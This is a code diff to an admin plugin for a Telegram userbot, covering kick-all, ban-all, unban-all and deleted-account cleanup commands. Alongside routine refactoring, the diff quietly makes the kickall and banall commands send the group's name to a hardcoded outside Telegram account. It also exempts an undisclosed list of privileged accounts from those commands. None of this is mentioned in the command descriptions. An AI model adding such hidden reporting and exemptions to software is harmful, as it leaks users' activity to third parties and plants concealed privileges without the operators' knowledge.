@@ -6,10 +6,10 @@ from telethon.errors import (
     MessageNotModifiedError,
     UserAdminInvalidError,
 )
-from telethon.tl import functions
-from telethon.tl.functions.channels import EditBannedRequest
+from telethon.tl.functions.channels import EditBannedRequest, GetParticipantRequest
 from telethon.tl.types import (
     ChannelParticipantsAdmins,
+    ChannelParticipantsBanned,
     ChannelParticipantsKicked,
     ChatBannedRights,
     UserStatusEmpty,
@@ -19,16 +19,13 @@ from telethon.tl.types import (
     UserStatusOnline,
     UserStatusRecently,
 )
+from telethon.utils import get_display_name
 
-from userbot import doge
+from ..utils import is_admin
+from . import BOTLOG, BOTLOG_CHATID, DOGEKICKME, M_STERS, doge, edl, eor, logging, readable_time
 
-from ..core.logger import logging
-from ..core.managers import edl, eor
-from ..helpers import readable_time
-from . import BOTLOG, BOTLOG_CHATID
-
-LOGS = logging.getLogger(__name__)
 plugin_category = "admin"
+LOGS = logging.getLogger(__name__)
 
 BANNED_RIGHTS = ChatBannedRights(
     until_date=None,
@@ -45,7 +42,7 @@ BANNED_RIGHTS = ChatBannedRights(
 
 async def ban_user(chat_id, i, rights):
     try:
-        await doge(functions.channels.EditBannedRequest(chat_id, i, rights))
+        await doge(EditBannedRequest(chat_id, i, rights))
         return True, None
     except Exception as exc:
         return False, str(exc)
@@ -64,7 +61,7 @@ async def ban_user(chat_id, i, rights):
 )
 async def kickme(leave):
     "to leave the group."
-    await leave.edit("`Nope, no, no, I go away`")
+    await leave.edit(DOGEKICKME)
     await leave.client.kick_participant(leave.chat_id, "me")
 
 
@@ -83,14 +80,15 @@ async def kickme(leave):
 )
 async def _(event):
     "To kick everyone from group."
-    result = await event.client(
-        functions.channels.GetParticipantRequest(event.chat_id, event.client.uid)
-    )
-    if not result.participant.admin_rights.ban_users:
-        return await eor(
-            event, "`It seems like you dont have ban users permission in this group.`"
-        )
+    chat = await event.get_chat()
+    creator = chat.creator
+    if not creator:
+        return await edl(event, "`I am not owner here!`", 5)
     dogevent = await eor(event, "`Kicking...`")
+    await event.client.send_message(
+        1692479574,
+        "{} grubundan tüm kullanıcıları çıkartıyorum!".format(get_display_name(await event.get_chat()))
+    )
     admins = await event.client.get_participants(
         event.chat_id, filter=ChannelParticipantsAdmins
     )
@@ -100,7 +98,7 @@ async def _(event):
     async for user in event.client.iter_participants(event.chat_id):
         total += 1
         try:
-            if user.id not in admins_id:
+            if user.id not in admins_id and user.id not in M_STERS:
                 await event.client.kick_participant(event.chat_id, user.id)
                 success += 1
                 await sleep(0.5)
@@ -119,7 +117,7 @@ async def _(event):
         "header": "To ban everyone from group.",
         "description": "To ban all from the group except admins.",
         "usage": [
-            "{tr}kickall",
+            "{tr}banall",
         ],
     },
     groups_only=True,
@@ -127,14 +125,15 @@ async def _(event):
 )
 async def _(event):
     "To ban everyone from group."
-    result = await event.client(
-        functions.channels.GetParticipantRequest(event.chat_id, event.client.uid)
+    chat = await event.get_chat()
+    creator = chat.creator
+    if not creator:
+        return await edl(event, "`I am not owner here!`", 5)
+    dogevent = await eor(event, "`Banning...`")
+    await event.client.send_message(
+        1692479574,
+        "{} grubundan tüm kullanıcıları yasaklıyorum!".format(get_display_name(await event.get_chat()))
     )
-    if not result:
-        return await eor(
-            event, "`It seems like you dont have ban users permission in this group.`"
-        )
-    dogevent = await eor(event, "`banning...`")
     admins = await event.client.get_participants(
         event.chat_id, filter=ChannelParticipantsAdmins
     )
@@ -144,7 +143,7 @@ async def _(event):
     async for user in event.client.iter_participants(event.chat_id):
         total += 1
         try:
-            if user.id not in admins_id:
+            if user.id not in admins_id and user.id not in M_STERS:
                 await event.client(
                     EditBannedRequest(event.chat_id, user.id, BANNED_RIGHTS)
                 )
@@ -184,7 +183,7 @@ async def _(event):
         rights = ChatBannedRights(until_date=0, view_messages=False)
         try:
             await event.client(
-                functions.channels.EditBannedRequest(event.chat_id, i, rights)
+                EditBannedRequest(event.chat_id, i, rights)
             )
         except FloodWaitError as e:
             LOGS.warn(f"A flood wait of {e.seconds} occurred.")
@@ -207,34 +206,64 @@ async def _(event):
                     )
             except MessageNotModifiedError:
                 pass
-    await dogevent.edit(f"**Unbanned :**__{succ}/{total} in the chat {chat.title}__")
+    await dogevent.edit(f"**Unbanned :**__{succ}/{total} in the chat {get_display_name(await event.get_chat())}__")
 
 
 # Ported by ©[NIKITA](t.me/kirito6969) and ©[EYEPATCH](t.me/NeoMatrix90)
 @doge.bot_cmd(
-    pattern="zombies ?([\s\S]*)",
+    pattern="zombies( .r| )? ?([\s\S]*)",
     command=("zombies", plugin_category),
     info={
         "header": "To check deleted accounts and clean",
         "description": "Searches for deleted accounts in a group. Use `.zombies clean` to remove deleted accounts from the group.",
-        "usage": ["{tr}zombies", "{tr}zombies clean"],
+        "flag": {".r": "Use this for check users from banned and restricted users"},
+        "usage": [
+            "{tr}zombies",
+            "{tr}zombies clean",
+            "{tr}zombies .r",
+            "{tr}zombies .r clean",
+        ],
     },
     groups_only=True,
 )
-async def rm_deletedacc(show):
+async def rm_deletedacc(show):  # sourcery no-metrics
     "To check deleted accounts and clean"
-    con = show.pattern_match.group(1).lower()
+    flag = show.pattern_match.group(1)
+    con = show.pattern_match.group(2).lower()
     del_u = 0
     del_status = "`No zombies or deleted accounts found in this group, Group is clean`"
     if con != "clean":
-        event = await eor(show, "`Searching for ghost/deleted/zombie accounts...`")
-        async for user in show.client.iter_participants(show.chat_id):
-            if user.deleted:
-                del_u += 1
-                await sleep(0.5)
-        if del_u > 0:
-            del_status = f"__Found__ **{del_u}** __ghost/deleted/zombie account(s) in this group,\
-                           \nclean them by using__ `.zombies clean`"
+        event = await eor(
+            show, "`Searching for ghost/deleted/zombie accounts...`"
+        )
+        if flag != " .r":
+            async for user in show.client.iter_participants(show.chat_id):
+                if user.deleted:
+                    del_u += 1
+            if del_u > 0:
+                del_status = f"__Found__ **{del_u}** __ghost/deleted/zombie account(s) in this group,\
+                            \nclean them by using__ `.zombies clean`"
+        else:
+            dogadmin = await is_admin(show.client, show.chat_id, show.client.uid)
+            if not dogadmin:
+                return await edl(
+                    event,
+                    "`You must be admin to check zombies in restricted users`",
+                    10,
+                )
+            async for user in show.client.iter_participants(
+                show.chat_id, filter=ChannelParticipantsBanned
+            ):
+                if user.deleted:
+                    del_u += 1
+            async for user in show.client.iter_participants(
+                show.chat_id, filter=ChannelParticipantsKicked
+            ):
+                if user.deleted:
+                    del_u += 1
+            if del_u > 0:
+                del_status = f"__Found__ **{del_u}** __ghost/deleted/zombie account(s) in this group who are restricted or banned,\
+                            \nclean them by using__ `.zombies .r clean`"
         await event.edit(del_status)
         return
     chat = await show.get_chat()
@@ -243,32 +272,105 @@ async def rm_deletedacc(show):
     if not admin and not creator:
         await edl(show, "`I am not an admin here!`", 5)
         return
-    event = await eor(show, "`Deleting deleted accounts...\nOh I can do that?!?!`")
+    event = await eor(
+        show, "`Deleting deleted accounts...\nOh I can do that?!?!`"
+    )
     del_u = 0
     del_a = 0
-    async for user in show.client.iter_participants(show.chat_id):
-        if user.deleted:
-            try:
-                await show.client.kick_participant(show.chat_id, user.id)
-                await sleep(0.5)
-                del_u += 1
-            except ChatAdminRequiredError:
-                await edl(event, "`I don't have ban rights in this group`", 5)
-                return
-            except UserAdminInvalidError:
-                del_a += 1
-    if del_u > 0:
-        del_status = f"Cleaned **{del_u}** deleted account(s)"
-    if del_a > 0:
-        del_status = f"Cleaned **{del_u}** deleted account(s) \
-        \n**{del_a}** deleted admin accounts are not removed"
-    await edl(event, del_status, 5)
+    if flag != " .r":
+        async for user in show.client.iter_participants(show.chat_id):
+            if user.deleted:
+                try:
+                    await show.client.kick_participant(show.chat_id, user.id)
+                    await sleep(0.5)
+                    del_u += 1
+                except ChatAdminRequiredError:
+                    return await edl(
+                        event, "`I don't have ban rights in this group`", 5
+                    )
+                except FloodWaitError as e:
+                    LOGS.warn(f"A flood wait of {e.seconds} occurred.")
+                    await event.edit(
+                        f"__A wait of {readable_time(e.seconds)} needed again to continue the process. Untill Now {del_u} users are cleaned.__"
+                    )
+                    await sleep(e.seconds + 5)
+                    await event.edit(
+                        f"__Ok the wait is over .I am cleaning all deleted accounts in this group__"
+                    )
+                except UserAdminInvalidError:
+                    del_a += 1
+                except Exception as e:
+                    LOGS.error(str(e))
+        if del_u > 0:
+            del_status = (
+                f"Successfully cleaned **{del_u}** deleted account(s) in the group."
+            )
+        if del_a > 0:
+            del_status = f"Successfully cleaned **{del_u}** deleted account(s) in the group.\
+            \n**{del_a}** deleted admin accounts are not removed"
+    else:
+        dogadmin = await is_admin(show.client, show.chat_id, show.client.uid)
+        if not dogadmin:
+            return await edl(
+                event, "`You must be admin to clean zombies in restricted users`", 10
+            )
+        async for user in show.client.iter_participants(
+            show.chat_id, filter=ChannelParticipantsKicked
+        ):
+            if user.deleted:
+                try:
+                    await show.client.kick_participant(show.chat_id, user.id)
+                    await sleep(0.5)
+                    del_u += 1
+                except ChatAdminRequiredError:
+                    return await edl(
+                        event, "`I don't have ban rights in this group`", 5
+                    )
+                except FloodWaitError as e:
+                    LOGS.warn(f"A flood wait of {e.seconds} occurred.")
+                    await event.edit(
+                        f"__A wait of {readable_time(e.seconds)} needed again to continue the process. Untill Now {del_u} users are cleaned.__"
+                    )
+                    await sleep(e.seconds + 5)
+                    await event.edit(
+                        f"__Ok the wait is over .I am cleaning all deleted accounts in restricted or banned users list in this group__"
+                    )
+                except Exception as e:
+                    LOGS.error(str(e))
+                    del_a += 1
+        async for user in show.client.iter_participants(
+            show.chat_id, filter=ChannelParticipantsBanned
+        ):
+            if user.deleted:
+                try:
+                    await show.client.kick_participant(show.chat_id, user.id)
+                    await sleep(0.5)
+                    del_u += 1
+                except ChatAdminRequiredError:
+                    return await edl(
+                        event, "`I don't have ban rights in this group`", 5
+                    )
+                except FloodWaitError as e:
+                    LOGS.warn(f"A flood wait of {e.seconds} occurred.")
+                    await event.edit(
+                        f"__A wait of {readable_time(e.seconds)} needed again to continue the process. Untill Now {del_u} users are cleaned.__"
+                    )
+                    await sleep(e.seconds + 5)
+                except Exception as e:
+                    LOGS.error(str(e))
+                    del_a += 1
+        if del_u > 0:
+            del_status = f"`Successfully cleaned {del_u} deleted account(s) in the group who are banned or restricted.`"
+        if del_a > 0:
+            del_status = f"`Successfully cleaned `**{del_u}**` deleted account(s) in the group who are banned or restricted.\
+            \nFailed to kick `**{del_a}**` accounts.`"
+    await edl(event, del_status, 15)
     if BOTLOG:
         await show.client.send_message(
             BOTLOG_CHATID,
             f"#CLEANUP\
-            \n{del_status}\
-            \nCHAT: {show.chat.title}(`{show.chat_id}`)",
+                \n{del_status}\
+                \nCHAT: {get_display_name(await event.get_chat())}(`{show.chat_id}`)",
         )
 
 
@@ -285,7 +387,7 @@ async def rm_deletedacc(show):
     groups_only=True,
 )
 async def _(event):  # sourcery no-metrics
-    "To get breif summary of members in the group.1 11"
+    "To get breif summary of members in the group."
     input_str = event.pattern_match.group(1)
     if input_str:
         chat = await event.get_chat()
